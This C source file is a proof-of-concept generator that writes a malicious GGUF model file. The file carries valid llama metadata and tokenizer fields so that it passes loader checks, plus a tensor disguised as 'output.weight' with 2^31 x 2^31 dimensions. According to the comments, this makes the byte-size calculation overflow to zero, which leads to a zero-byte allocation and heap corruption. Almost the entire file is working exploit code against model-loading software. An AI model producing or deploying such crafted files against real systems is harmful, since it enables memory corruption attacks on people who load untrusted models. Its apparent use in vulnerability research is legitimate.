/*
 * complete_malicious_gguf.c
 *
 * Generates a malicious GGUF file with ALL required KV pairs for llama architecture
 * AND an overflow-inducing tensor. This is the corrected PoC that should pass
 * load_hparams and load_vocab, reaching the actual tensor loading overflow.
 *
 * Build: gcc -o complete_malicious_gguf complete_malicious_gguf.c -Wall
 * Run:   ./complete_malicious_gguf
 *
 * Output: /tmp/malicious_complete.gguf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define GGUF_MAGIC     "GGUF"
#define GGUF_VERSION   3
#define GGUF_ALIGNMENT 32

enum ggml_type {
    GGML_TYPE_F32 = 0,
    GGML_TYPE_F16 = 1,
    GGML_TYPE_Q8_0 = 8,
};

enum gguf_type {
    GGUF_TYPE_UINT8 = 0, GGUF_TYPE_INT8, GGUF_TYPE_UINT16, GGUF_TYPE_INT16,
    GGUF_TYPE_UINT32, GGUF_TYPE_INT32, GGUF_TYPE_FLOAT32, GGUF_TYPE_BOOL,
    GGUF_TYPE_STRING, GGUF_TYPE_ARRAY, GGUF_TYPE_UINT64, GGUF_TYPE_INT64,
    GGUF_TYPE_FLOAT64, GGUF_TYPE_COUNT,
};

static void write_u32(FILE *f, uint32_t v) { fwrite(&v, 1, 4, f); }
static void write_u64(FILE *f, uint64_t v) { fwrite(&v, 1, 8, f); }
static void write_i32(FILE *f, int32_t v)  { fwrite(&v, 1, 4, f); }
static void write_i64(FILE *f, int64_t v)  { fwrite(&v, 1, 8, f); }
static void write_f32(FILE *f, float v)    { fwrite(&v, 1, 4, f); }

static void write_string(FILE *f, const char *s) {
    uint64_t len = strlen(s);
    write_u64(f, len);
    fwrite(s, 1, len, f);
}

static void pad_to(FILE *f, size_t alignment) {
    long pos = ftell(f);
    size_t pad = (alignment - ((size_t)pos % alignment)) % alignment;
    for (size_t i = 0; i < pad; i++) fputc(0, f);
}

/* Write a KV string pair */
static void write_kv_string(FILE *f, const char *key, const char *value) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_STRING);
    write_string(f, value);
}

/* Write a KV uint32 pair */
static void write_kv_u32(FILE *f, const char *key, uint32_t value) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_UINT32);
    write_u32(f, value);
}

/* Write a KV float32 pair */
static void write_kv_f32(FILE *f, const char *key, float value) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_FLOAT32);
    write_f32(f, value);
}

/* Write a KV string array pair */
static void write_kv_string_array(FILE *f, const char *key, const char **values, uint64_t count) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_ARRAY);
    write_i32(f, GGUF_TYPE_STRING);
    write_u64(f, count);
    for (uint64_t i = 0; i < count; i++) {
        write_string(f, values[i]);
    }
}

/* Write a KV float32 array pair */
static void write_kv_f32_array(FILE *f, const char *key, const float *values, uint64_t count) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_ARRAY);
    write_i32(f, GGUF_TYPE_FLOAT32);
    write_u64(f, count);
    for (uint64_t i = 0; i < count; i++) {
        write_f32(f, values[i]);
    }
}

/* Write a uint32 array (per-layer values, repeated n_layer times) */
static void write_kv_u32_array(FILE *f, const char *key, uint32_t value, uint64_t count) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_ARRAY);
    write_i32(f, GGUF_TYPE_UINT32);
    write_u64(f, count);
    for (uint64_t i = 0; i < count; i++) {
        write_u32(f, value);
    }
}

int main() {
    FILE *f = fopen("/tmp/malicious_complete.gguf", "wb");
    if (!f) { perror("fopen"); return 1; }

    printf("=== Complete Malicious GGUF Generator ===\n\n");

    // Magic + version
    fwrite(GGUF_MAGIC, 1, 4, f);
    write_u32(f, GGUF_VERSION);

    // We'll come back to fill in n_tensors and n_kv
    long n_tensors_pos = ftell(f);
    write_i64(f, 0); // placeholder
    long n_kv_pos = ftell(f);
    write_i64(f, 0); // placeholder

    int kv_count = 0;
    int tensor_count = 0;

    // === Required llama architecture KV pairs ===
    write_kv_string(f, "general.architecture", "llama"); kv_count++;
    write_kv_string(f, "general.name", "malicious"); kv_count++;
    write_kv_string(f, "general.author", "researcher"); kv_count++;

    // Minimal llama hparams (1 layer, tiny dimensions to pass validation)
    uint32_t n_layer = 1;
    uint32_t n_embd = 64;
    uint32_t n_ctx = 512;
    uint32_t n_head = 4;
    uint32_t n_ff = 128;
    float norm_eps = 1e-5f;

    write_kv_u32(f, "llama.block_count", n_layer); kv_count++;
    write_kv_u32(f, "llama.embedding_length", n_embd); kv_count++;
    write_kv_u32(f, "llama.context_length", n_ctx); kv_count++;
    write_kv_u32(f, "llama.attention.head_count", n_head); kv_count++;
    write_kv_u32(f, "llama.feed_forward_length", n_ff); kv_count++;
    write_kv_f32(f, "llama.attention.layer_norm_rms_epsilon", norm_eps); kv_count++;

    // Per-layer arrays (all 1 element since n_layer=1)
    write_kv_u32_array(f, "llama.attention.head_count_kv", n_head, n_layer); kv_count++;

    // === Minimal tokenizer KV pairs ===
    const char *tokens[] = {"<pad>", "<s>", "</s>", "<unk>", "hello", "world"};
    uint64_t n_vocab = sizeof(tokens) / sizeof(tokens[0]);
    write_kv_string_array(f, "tokenizer.ggml.tokens", tokens, n_vocab); kv_count++;

    float scores[] = {-10000.0f, -10000.0f, -10000.0f, -10000.0f, 0.0f, 0.0f};
    write_kv_f32_array(f, "tokenizer.ggml.scores", scores, n_vocab); kv_count++;

    write_kv_u32(f, "tokenizer.ggml.bos_token_id", 1); kv_count++;
    write_kv_u32(f, "tokenizer.ggml.eos_token_id", 2); kv_count++;
    write_kv_u32(f, "tokenizer.ggml.padding_token_id", 0); kv_count++;
    write_kv_u32(f, "tokenizer.ggml.unknown_token_id", 3); kv_count++;

    // === Tensor: token_embd.weight (normal, required by llama) ===
    // Shape: [n_vocab, n_embd, 1, 1] = [6, 64, 1, 1]
    {
        write_string(f, "token_embd.weight");
        write_u32(f, 4); // n_dims
        write_i64(f, n_vocab);
        write_i64(f, n_embd);
        write_i64(f, 1);
        write_i64(f, 1);
        write_i32(f, GGML_TYPE_F32);
        write_u64(f, 0); // data offset (will be calculated)
        tensor_count++;
    }

    // === Tensor: THE OVERFLOW TENSOR ===
    // Named to look like a real tensor but with overflow dimensions
    // ne = {2^31, 2^31, 1, 1}, F32
    {
        write_string(f, "output.weight");  // common llama tensor name
        write_u32(f, 4); // n_dims
        write_i64(f, (int64_t)1 << 31);  // ne[0] = 2^31
        write_i64(f, (int64_t)1 << 31);  // ne[1] = 2^31
        write_i64(f, 1);                  // ne[2] = 1
        write_i64(f, 1);                  // ne[3] = 1
        write_i32(f, GGML_TYPE_F32);
        write_u64(f, 0); // data offset
        tensor_count++;
    }

    // Pad to alignment before tensor data
    pad_to(f, GGUF_ALIGNMENT);

    long data_start = ftell(f);

    // Write token_embd.weight data: 6 * 64 * 4 = 1536 bytes
    {
        long tensor_start = ftell(f);
        // Patch the offset for this tensor (it's the first tensor, offset = 0 relative to data section)
        // We need to go back and fix the offset field. For simplicity, we pre-calculate.
        // Actually, let's just write the data and note the offset.
        for (int i = 0; i < (int)(n_vocab * n_embd); i++) {
            float val = 0.0f;
            write_f32(f, val);
        }
        printf("token_embd.weight: offset=%ld, size=%ld\n", tensor_start, ftell(f) - tensor_start);
    }

    // Write overflow tensor data: minimal (4 bytes)
    // The overflow happens during stride calculation, not data read
    {
        long tensor_start = ftell(f);
        for (int i = 0; i < 4; i++) fputc(0, f);
        pad_to(f, GGUF_ALIGNMENT);
        printf("output.weight (overflow): offset=%ld, size=%ld\n", tensor_start, ftell(f) - tensor_start);
    }

    long file_size = ftell(f);

    // Go back and patch n_tensors and n_kv
    fseek(f, n_tensors_pos, SEEK_SET);
    write_i64(f, tensor_count);
    fseek(f, n_kv_pos, SEEK_SET);
    write_i64(f, kv_count);

    fclose(f);

    printf("\nFile: /tmp/malicious_complete.gguf\n");
    printf("Size: %ld bytes\n", file_size);
    printf("KV pairs: %d\n", kv_count);
    printf("Tensors: %d\n", tensor_count);
    printf("\nOverflow tensor: ne={2^31, 2^31, 1, 1}, F32\n");
    printf("  nb[2] = 4 * 2^31 * 2^31 = 2^64 -> wraps to 0\n");
    printf("  ggml_nbytes returns 0 -> 0-byte allocation\n");
    printf("  Compute writes to unallocated memory -> heap corruption\n");

    return 0;
}
